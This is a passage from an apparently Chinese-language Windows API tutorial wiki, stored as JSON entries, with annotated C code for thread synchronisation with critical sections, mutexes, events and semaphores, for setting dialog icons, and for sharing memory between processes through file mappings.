GetDlgItem(hwndDlg, IDC_EDIT_THREAD1); g_hEdit_Thread2 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD2); g_hEdit_Thread3 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD3); SetWindowText(g_hEdit_RedPacket, TEXT(&quot;1000&quot;)); //红包池初始金额为1000 SetWindowText(g_hEdit_Thread1, TEXT(&quot;0&quot;)); //线程初始金额为0 SetWindowText(g_hEdit_Thread2, TEXT(&quot;0&quot;)); SetWindowText(g_hEdit_Thread3, TEXT(&quot;0&quot;)); return TRUE; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread; hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// 创建一个新线程作为工作线程，防止UI卡顿 CloseHandle(hWorkerThread); return TRUE; &#125; &#125; return FALSE;&#125;//工作线程DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[3] = &#123;NULL&#125;; hThreads[0] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread1, 0, NULL); //线程2 hThreads[1] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread2, 0, NULL); //线程2 hThreads[2] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread3, 0, NULL); //线程3 WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hThreads[i]); &#125; DeleteCriticalSection(&amp;g_cs); return 0;&#125;//抢红包线程DWORD WINAPI ThreadFunc(LPVOID lpParameter)&#123; HWND hEditThread = (HWND)lpParameter; TCHAR szBuffer[10] = &#123; 0 &#125;; DWORD dwThreadSum = 0; while (TRUE) &#123; EnterCriticalSection(&amp;g_cs); // 进入临界区 //取红包池中当前的金额 &lt;=0就break，&gt;=0就抢红包 GetWindowText(g_hEdit_RedPacket, szBuffer, 10); // 从红包池编辑框读值 DWORD dwRedPacketPool = atoi(szBuffer); // 字符转数字 if (dwRedPacketPool &lt;= 0) &#123; LeaveCriticalSection(&amp;g_cs); break; &#125; //红包池里还有红包 dwRedPacketPool -= 50; // -50 sprintf(szBuffer, &quot;%d&quot;, dwRedPacketPool); // 数字转字符 SetWindowText(g_hEdit_RedPacket, szBuffer); // 更新红包池中 //线程开始抢红包，每次抢50 GetWindowText(hEditThread, szBuffer, 10); // 从编辑框读值 dwThreadSum = atoi(szBuffer); // 字符转数字 dwThreadSum += 50; // +50后放回 sprintf(szBuffer, &quot;%d&quot;, dwThreadSum); // 数字转字符 SetWindowText(hEditThread, szBuffer); // 设置线程后面编辑框的值 LeaveCriticalSection(&amp;g_cs); Sleep(500); //防止一个线程直接将红包池里的红包抢光 &#125; return 0;&#125;互斥锁123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126//互斥锁#include &quot;resource.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfBOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ThreadFunc(LPVOID lpParameter);HANDLE g_hMutex = NULL;HWND g_hEdit_RedPacket = NULL;HWND g_hEdit_Thread1 = NULL;HWND g_hEdit_Thread2 = NULL;HWND g_hEdit_Thread3 = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_INITDIALOG: g_hEdit_RedPacket = GetDlgItem(hwndDlg, IDC_EDIT_REDPACKETPOOL); g_hEdit_Thread1 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD1); g_hEdit_Thread2 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD2); g_hEdit_Thread3 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD3); SetWindowText(g_hEdit_RedPacket, TEXT(&quot;1000&quot;)); //红包池初始金额为1000 SetWindowText(g_hEdit_Thread1, TEXT(&quot;0&quot;)); //线程初始金额为0 SetWindowText(g_hEdit_Thread2, TEXT(&quot;0&quot;)); SetWindowText(g_hEdit_Thread3, TEXT(&quot;0&quot;)); return TRUE; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread; hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// 创建一个新线程作为工作线程，防止UI卡顿 CloseHandle(hWorkerThread); return TRUE; &#125; &#125; return FALSE;&#125;//工作线程DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hMutex = CreateMutex(NULL, FALSE, NULL); HANDLE hThreads[3] = &#123; NULL &#125;; hThreads[0] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread1, 0, NULL); //线程2 hThreads[1] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread2, 0, NULL); //线程2 hThreads[2] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread3, 0, NULL); //线程3 WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hThreads[i]); &#125; CloseHandle(g_hMutex); return 0;&#125;//抢红包线程DWORD WINAPI ThreadFunc(LPVOID lpParameter)&#123; HWND hEditThread = (HWND)lpParameter; TCHAR szBuffer[10] = &#123; 0 &#125;; DWORD dwThreadSum = 0; while (TRUE) &#123; WaitForSingleObject(g_hMutex, INFINITE); //等待获取互斥锁 //取红包池中当前的金额 &lt;=0就break，&gt;=0就抢红包 GetWindowText(g_hEdit_RedPacket, szBuffer, 10); // 从红包池编辑框读值 DWORD dwRedPacketPool = atoi(szBuffer); // 字符转数字 if (dwRedPacketPool &lt;= 0) &#123; ReleaseMutex(g_hMutex); //释放互斥锁 break; &#125; //红包池里还有红包 dwRedPacketPool -= 50; // -50 sprintf(szBuffer, &quot;%d&quot;, dwRedPacketPool); // 数字转字符 SetWindowText(g_hEdit_RedPacket, szBuffer); // 更新红包池中 //线程开始抢红包，每次抢50 GetWindowText(hEditThread, szBuffer, 10); // 从编辑框读值 dwThreadSum = atoi(szBuffer); // 字符转数字 dwThreadSum += 50; // +50后放回 sprintf(szBuffer, &quot;%d&quot;, dwThreadSum); // 数字转字符 SetWindowText(hEditThread, szBuffer); // 设置线程后面编辑框的值 ReleaseMutex(g_hMutex); //释放互斥锁 Sleep(500); //防止一个线程直接将红包池里的红包抢光 &#125; return 0;&#125;"},{"title":"使用图标","path":"/wiki/Windows_API/使用图标.html","content":"继续用上一节的对话框代码作为示例，项目，右键“添加”-“资源”，选择Icon。 “新建”是自己画，选择“导入”，传两张ico图上来。在资源视图，选择目标Ico图标，右键，属性，在弹出的ID那改下ID。 用LoadIcon获取图标句柄，在对话框初始化WM_INITDIALOG那用SendMessage发消息给对话框设置图标。 123456789case WM_INITDIALOG: //对话框创建的事件，像之前写窗口程序时的WM_CREATE hBigIcon = LoadIcon(g_hInstance, MAKEINTRESOURCE(IDI_ICON_BIG)); hSmallIcon = LoadIcon(g_hInstance, MAKEINTRESOURCE(IDI_ICON_SMALL)); //设置图标 SendMessage(hwndDlg, WM_SETICON, ICON_BIG, (LPARAM)hBigIcon); SendMessage(hwndDlg, WM_SETICON, ICON_SMALL, (LPARAM)hSmallIcon); return TRUE; ICON_BIG和ICON_SMALL是预定义的标识符 ICON_BIG：设置大图标 ICON_SMALL：设置小图标 在这里例子中fg.icon是用于设置为大图标，Lord PE那个icon设置为小图标 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);HINSTANCE g_hInstance = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; g_hInstance = hInstance; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG1), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HICON hBigIcon = NULL; HICON hSmallIcon = NULL; switch (uMsg) &#123; case WM_INITDIALOG: //对话框创建的消息，像之前写窗口程序时的WM_CREATE hBigIcon = LoadIcon( g_hInstance, // 应用程序实例句柄 MAKEINTRESOURCE(IDI_ICON_BIG) // 资源标识符 ); hSmallIcon = LoadIcon( g_hInstance, // 应用程序实例句柄 MAKEINTRESOURCE(IDI_ICON_SMALL) // 资源标识符 ); // 设置大图标 SendMessage( hwndDlg, // 对话框窗口句柄 WM_SETICON, // 消息标识符，指示设置图标 ICON_BIG, // 图标类型标识符。ICON_BIG是预定义的标识符，表示设置大图标 (LPARAM)hBigIcon // 图标句柄 ); // 设置小图标 SendMessage( hwndDlg, // 对话框窗口句柄 WM_SETICON, // 消息标识符，指示设置图标 ICON_SMALL, // 图标类型标识符。ICON_SMALL是预定义的标识符，表示设置小图标 (LPARAM)hSmallIcon // 图标句柄 ); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case ID_BUTTON_OK: return TRUE; case ID_BUTTON_EXIT: EndDialog(hwndDlg, 0); //关闭对话框 return TRUE; &#125; break; &#125; return FALSE;&#125; 运行结果 小图标大图标对话框左上角，等其余地方，显示的是小图标 任务栏下方，Alt+Tab，等位置显示的是大图标 一般来说大图标和小图标用同一个图标，这里是为了演示什么是大图标，什么是小图标，所以用了两张图。"},{"title":"信号量（Semaphore）","path":"/wiki/Windows_API/信号量.html","content":"前言 事件有“通知”功能，能用于线程同步，但事件没法控制具体通知几个线程，而信号量可以，信号量有资源计数的概念。可以将信号量也理解为事件（何时通知其他线程可以开始干活），只不过有资源计数的概念。 相关API 使用CreateSemaphoreA创建信号量对象 123456HANDLE CreateSemaphoreA( [in, optional] LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, // SD [in] LONG lInitialCount, // initial count 初始可用资源数 [in] LONG lMaximumCount, // maximum count 最大可用资源数 [in, optional] LPCSTR lpName // object name); 参数 lInitialCount 指定初始可用资源数量，假设初始资源数量为 2，如果有 5 个线程正在调用 WaitForSingleObject 函数等待该信号量，则有 2 个线程会被唤醒，每调用一次 WaitForSingleObject 获得 Semaphore 对象，该对象的资源计数会减少一个。 参数 lMaximumCount 最大资源数量上限，这个值必须大于0 线程调用WaitForSingleObject等待信号量可用，等待到后信号量的资源计数会减1.如果使用 ReleaseSemaphore （释放信号量）来增加资源计数 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // handle to semaphore [in] LONG lReleaseCount, // count increment amount 需要增加的资源个数 [out, optional] LPLONG lpPreviousCount // previous count); 参数 hSemaphore 是需要操作的信号量句柄； 参数 lReleaseCount，需要增加的资源数量； 参数 lpPreviousCount 是一个 long 型（32 位系统上 4 个字节）的指针，函数执行成功后，返回上一次资源的数量，如果用不到该参数，可以设置为 NULL。 使用ReleaseSemaphore增加资源数量，最大不能超过lMaximumCount，这个值必须设置大于 0 事件VS信号量 界面中的编辑框都要从0逐次+1递增到50。当开始按钮按下后，Primary后的编辑框先从递增，Primary递增完后下面的Secondary编辑框才能开始递增。 使用事件和信号量都可以做到控制先后顺序，但事件没法控制下面具体有几个编辑框开始递增。 事件信号量123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#include &lt;Windows.h&gt;#include &quot;resource.h&quot;#include &lt;stdio.h&gt;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter);DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter);HWND g_hEditPrimary = NULL;HWND g_hEditSecondary1 = NULL;HWND g_hEditSecondary2 = NULL;HWND g_hEditSecondary3 = NULL;HANDLE g_hEvent = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //对话框初始化的消息 &#123; g_hEditPrimary = GetDlgItem(hwndDlg, IDC_EDIT_PRIMARY); g_hEditSecondary1 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY1); g_hEditSecondary2 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY2); g_hEditSecondary3 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY3); SetWindowText(g_hEditPrimary, TEXT(&quot;0&quot;)); //设置所有编辑框初始显示0 SetWindowText(g_hEditSecondary1, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary2, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary3, TEXT(&quot;0&quot;)); return TRUE; &#125; case WM_COMMAND: //子窗口消息 switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: //IDC_BUTTON_START按钮 HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// 创建一个新线程作为工作线程，防止UI卡顿 CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//工作线程DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; // 创建手动重置事件对象 g_hEvent = CreateEvent( NULL, // 使用默认安全属性 TRUE, // 手动重置 FALSE, // 初始为无信号状态 NULL // NULL 匿名对象 ); //先递增的线程 HANDLE hPrimaryThread = CreateThread(NULL, 0, PrimaryThreadProc, g_hEditPrimary, 0, NULL); CloseHandle(hPrimaryThread); //后递增的线程 HANDLE hSecondaryThreads[3] = &#123; NULL &#125;; hSecondaryThreads[0] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary1, 0, NULL); //线程1 hSecondaryThreads[1] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary2, 0, NULL); //线程2 hSecondaryThreads[2] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary3, 0, NULL); //线程3 WaitForMultipleObjects(3, hSecondaryThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hSecondaryThreads[i]); &#125; CloseHandle(g_hEvent); return 0;&#125;//先递增的线程DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // 数字转字符 ++dwCount; SetWindowText(hEdit, buf); // 设置编辑框的值 Sleep(100); // 睡眠一下，显示效果好 &#125; // 设置事件对象为有信号状态，通知其他线程 SetEvent(g_hEvent); return 0;&#125;//后递增的线程DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; // 等待事件对象被设置为有信号状态 WaitForSingleObject(g_hEvent, INFINITE); //线程函数不放开头，防止降低程序效率 while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // 数字转字符 ++dwCount; SetWindowText(hEdit, buf); // 设置编辑框的值 Sleep(100); // 睡眠一下，显示效果好 &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include &lt;Windows.h&gt;#include &quot;resource.h&quot;#include &lt;stdio.h&gt;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter);DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter);HWND g_hEditPrimary = NULL;HWND g_hEditSecondary1 = NULL;HWND g_hEditSecondary2 = NULL;HWND g_hEditSecondary3 = NULL;HANDLE g_hSemaphore = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //对话框初始化的消息 &#123; g_hEditPrimary = GetDlgItem(hwndDlg, IDC_EDIT_PRIMARY); g_hEditSecondary1 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY1); g_hEditSecondary2 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY2); g_hEditSecondary3 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY3); SetWindowText(g_hEditPrimary, TEXT(&quot;0&quot;)); //设置所有编辑框初始显示0 SetWindowText(g_hEditSecondary1, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary2, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary3, TEXT(&quot;0&quot;)); return TRUE; &#125; case WM_COMMAND: //子窗口消息 switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: //IDC_BUTTON_START按钮 HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// 创建一个新线程作为工作线程，防止UI卡顿 CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//工作线程DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; //// 创建手动重置事件对象 //g_hEvent = CreateEvent( // NULL, // 使用默认安全属性 // TRUE, // 手动重置 // FALSE, // 初始为无信号状态 // NULL // NULL 匿名对象 //); // 创建信号量 g_hSemaphore = CreateSemaphore( NULL, // 默认安全属性 0, // 初始计数 3, // 最大计数 NULL // 匿名信号量 ); //先递增的线程 HANDLE hPrimaryThread = CreateThread(NULL, 0, PrimaryThreadProc, g_hEditPrimary, 0, NULL); CloseHandle(hPrimaryThread); //后递增的线程 HANDLE hSecondaryThreads[3] = &#123; NULL &#125;; hSecondaryThreads[0] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary1, 0, NULL); //线程1 hSecondaryThreads[1] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary2, 0, NULL); //线程2 hSecondaryThreads[2] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary3, 0, NULL); //线程3 WaitForMultipleObjects(3, hSecondaryThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hSecondaryThreads[i]); &#125; //CloseHandle(g_hEvent); CloseHandle(g_hSemaphore); return 0;&#125;//先递增的线程DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // 数字转字符 SetWindowText(hEdit, buf); // 设置编辑框的值 ++dwCount; Sleep(100); // 睡眠一下，显示效果好 &#125; //// 设置事件对象为有信号状态，通知其他线程 //SetEvent(g_hEvent); // 释放信号量，允许后续的三个线程同时开始 ReleaseSemaphore( g_hSemaphore, // 信号量句柄 3, // 递增的信号量计数值 NULL // 旧的信号量计数值（不需要） ); return 0;&#125;//后递增的线程DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; // 等待事件对象被设置为有信号状态 WaitForSingleObject(g_hSemaphore, INFINITE); //线程函数不放开头，防止降低程序效率 while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // 数字转字符 SetWindowText(hEdit, buf); // 设置编辑框的值 ++dwCount; Sleep(100); // 睡眠一下，显示效果好 &#125; ReleaseSemaphore(g_hSemaphore, 1, NULL); return 0;&#125;"},{"title":"共享内存的申请和释放","path":"/wiki/Windows_API/共享内存的申请和释放.html","content":"CreateFileMappingW CreateFileMapping用于创建一个文件映射（File mapping）内核对象，该内核对象为开发者准备一块可用于映射的物理内存 12345678HANDLE CreateFileMappingW( [in] HANDLE hFile, // handle to file [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // security 安全描述符属性 [in] DWORD flProtect, // protection [in] DWORD dwMaximumSizeHigh, // high-order DWORD of size [in] DWORD dwMaximumSizeLow, // low-order DWORD of size [in, optional] LPCWSTR lpName // object name); hFile INVALID_HANDLE_VALUE：就只准备物理内存，不会与文件进行关联 传hFile这个参数，不但准备物理页，还会将这个文件映射到物理页上 lpFileMappingAttributes：安全描述符属性 flProtect：准备的物理内存是什么属性 PAGE_READONLY：只读 PAGE_READWRITE：可读可写 PAGE_WRITECOPY：写拷贝 dwMaximumSizeHigh和dwMaximumSizeLow用于指定要多大一块物理内存 dwMaximumSizeHigh是高32位 dwMaximumSizeLow是低32位 dwMaximumSizeHigh：The high-order DWORD of the maximum size of the file mapping object.高32位的值。 在32位系统中设置为空，因为32位系统只有32位，用dwMaximumSizeLow来指定。 dwMaximumSizeLow：The low-order DWORD of the maximum size of the file mapping object.低32位的值。 lpName：该内核对象的名字。 多进程要用到该内核对象，就要起名字 只是自己进程中用到，可以是匿名对象 调用CreateFileMapping后，物理页已准备好，但是这些物理页和进程的虚拟地址空间没关联，要用MapViewOfFile函数建立物理页与进程虚拟地址空间之间的映射，随后进程就可以通过虚拟地址来访问该物理页（如果创建物理页时有映射文件，那访问该物理页就是访问映射的文件内容）。 MapViewOfFile Maps a view of a file mapping into the address space of a calling process. 将物理页与进程的虚拟地址空间做关联 1234567LPVOID MapViewOfFile( [in] HANDLE hFileMappingObject, // handle to file-mapping object file-mapping [in] DWORD dwDesiredAccess, // access mode [in] DWORD dwFileOffsetHigh, // high-order DWORD of offset [in] DWORD dwFileOffsetLow, // low-order DWORD of offset [in] SIZE_T dwNumberOfBytesToMap // number of bytes to map); hFileMappingObject：要映射的FileMapping对象的句柄 dwDesiredAccess：指定虚拟内存的属性 线性地址属性的限制只能比物理页属性的限制更严格，不能更宽松 上面CreateFileMappingW函数参数flProtect指定的是物理内存的属性。 比如CreateFileMappingW创建物理页时PAGE_READWRITE可读可写，MapViewOfFile建立映射时指定虚拟地址FILE_MAP_READ只读 但返过来不行，创建物理页时只读，MapViewOfFile说虚拟内存可读可写，这样MapViewOfFile会执行失败 FILE_MAP_COPY：写拷贝 dwFileOffsetHigh：高32位。A high-order DWORD of the file offset where the view begins. dwFileOffsetLow：低32位。A low-order DWORD of the file offset where the view is to begin. 比如从物理页0地址开始映射，映射dwNumberOfBytesToMap个字节的大小。 dwNumberOfBytesToMap：映射多大的内存。The number of bytes of a file mapping to map to the view. All bytes must be within the maximum size specified by CreateFileMapping. If this parameter is 0 (zero), the mapping extends from the specified offset to the end of the file mapping. 例 共享内存的申请和释放 UnmapViewOfFile(g_lpBuff)关闭映射，线性地址没了，物理页还在 CloseHandle(g_hMapFile)只是让文件映射内核对象引用计数器减1，只有当该内核对象计数器为0时，该物理页才会释放 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#define MapFileName &quot;共享内存&quot; // FileMapping对象名称#define BUF_SIZE 0x1000 // 分配的内存大小（4KB）HANDLE g_hMapFile; // FileMapping对象句柄LPTSTR g_lpBuff; // 指向线性地址区域的指针int main(int argc, char* argv[])&#123; getchar(); // 等待，用于观察 // 创建文件映射对象 g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // 只准备物理内存，不会与文件进行关联 NULL, // 默认安全性 PAGE_READWRITE, // 读写权限 0, // 物理页大小-高32位的值（0表示不指定） BUF_SIZE, // 物理页大小-低32位的值 MapFileName); // object name // 将FileMapping对象映射到进程的线性地址空间 g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMapping对象句柄 FILE_MAP_ALL_ACCESS, // 允许读写访问 0, // 高32位偏移量 0, // 低32位偏移量 BUF_SIZE); // 虚拟内存空间映射大小 // 在映射的虚拟地址空间写入数据 *(PDWORD)g_lpBuff = 0x12345678; printf(&quot;%p&quot;, g_lpBuff); getchar(); // 等待，用于观察 UnmapViewOfFile(g_lpBuff); // 解除映射 CloseHandle(g_hMapFile); // 关闭句柄 getchar(); // 等待，用于观察 return 0;&#125; 创建共享内存前创建共享内存+建立映射解除映射关系输出12003A0000 申请物理页并建立映射后，多了0x3a0-0x3a0那行 commit为0的原因是：MapViewOfFile建立了这种映射，操作系统会在使用这块虚拟内存时挂上物理页 解除映射关系后，0x3a0那行没了 多进程使用共享内存 CreateFileMapping中的FileMapping对象如果已存在，CreateFileMapping返回已存在的这个FileMapping对象的句柄。（和CreateMutex等api一样） If the function succeeds, the return value is a handle to the newly created file mapping object. If the object exists before the function call, the function returns a handle to the existing object (with its current size, not the specified size), and GetLastError returns ERROR_ALREADY_EXISTS. 进程A和进程B都用MapViewOfFile建立自己虚拟空间地址到同一物理页的映射，进程A的起始虚拟地址和进程B的起始虚拟地址的值没联系。可能进程A是从线性地址003A0000开始映射到物理页，进程B可能从003A0000或其他线性地址开始映射到物理页 程序A程序B123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#define MapFileName &quot;共享内存&quot; // FileMapping对象名称#define BUF_SIZE 0x1000 // 分配的内存大小（4KB）HANDLE g_hMapFile; // FileMapping对象句柄LPTSTR g_lpBuff; // 指向线性地址区域的指针int main(int argc, char* argv[])&#123; // 创建文件映射对象 g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // 只准备物理内存，不会与文件进行关联 NULL, // 默认安全性 PAGE_READWRITE, // 读写权限 0, // 物理页大小-高32位的值（0表示不指定） BUF_SIZE, // 物理页大小-低32位的值 MapFileName); // object name // 将FileMapping对象映射到进程的线性地址空间 g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMapping对象句柄 FILE_MAP_ALL_ACCESS, // 允许读写访问 0, // 高32位偏移量 0, // 低32位偏移量 BUF_SIZE); // 虚拟内存空间映射大小 *(PDWORD)g_lpBuff = 0x12345678; // 在映射的虚拟地址空间写入数据 printf(&quot;已创建物理页，进程A的线性地址是：%p &quot;, g_lpBuff); printf(&quot;已往物理页写入的值：0x%x &quot;, *(PDWORD)g_lpBuff); printf(&quot;请运行程序B访问这块共享内存 &quot;); getchar(); // 等待，用于观察 UnmapViewOfFile(g_lpBuff); // 解除映射 CloseHandle(g_hMapFile); // 关闭句柄 return 0;&#125;123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#define MapFileName &quot;共享内存&quot; // FileMapping对象名称#define BUF_SIZE 0x1000 // 分配的内存大小（4KB）HANDLE g_hMapFile; // FileMapping对象句柄LPTSTR g_lpBuff; // 指向线性地址区域的指针int main(int argc, char* argv[])&#123; // 创建文件映射对象 g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // 只准备物理内存，不会与文件进行关联 NULL, // 默认安全性 PAGE_READWRITE, // 读写权限 0, // 物理页大小-高32位的值（0表示不指定） BUF_SIZE, // 物理页大小-低32位的值 MapFileName); // object name // 将FileMapping对象映射到进程的线性地址空间 g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMapping对象句柄 FILE_MAP_ALL_ACCESS, // 允许读写访问 0, // 高32位偏移量 0, // 低32位偏移量 BUF_SIZE); // 虚拟内存空间映射大小 printf(&quot;已创建物理页，进程B的线性地址是：%p &quot;, g_lpBuff); printf(&quot;进程B读取到的值：0x%x &quot;, *(PDWORD)g_lpBuff); getchar(); // 等待，用于观察 UnmapViewOfFile(g_lpBuff); // 解除映射 CloseHandle(g_hMapFile); // 